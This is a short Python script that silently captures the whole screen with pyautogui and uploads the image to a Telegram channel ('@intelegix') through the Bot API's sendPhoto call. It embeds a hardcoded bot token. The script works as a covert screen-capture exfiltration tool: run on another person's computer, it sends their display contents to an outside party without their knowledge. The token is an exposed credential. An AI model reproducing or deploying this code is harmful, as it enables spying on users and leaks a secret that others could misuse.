import requests
import pyautogui

pyautogui.screenshot(r"screenshot1.png")

token = "1362521589:AAETxO9b_8NLgVpCVe4yD4I5q9U2SwPeYbw"
chat_id = '@intelegix'  # chat id
file = 'screenshot1.png'

url = f"https://api.telegram.org/bot{token}/sendPhoto"

print(url)
files = {}
files["photo"] = open(file, "rb")
print(requests.get(url, params={"chat_id": chat_id}, files=files))
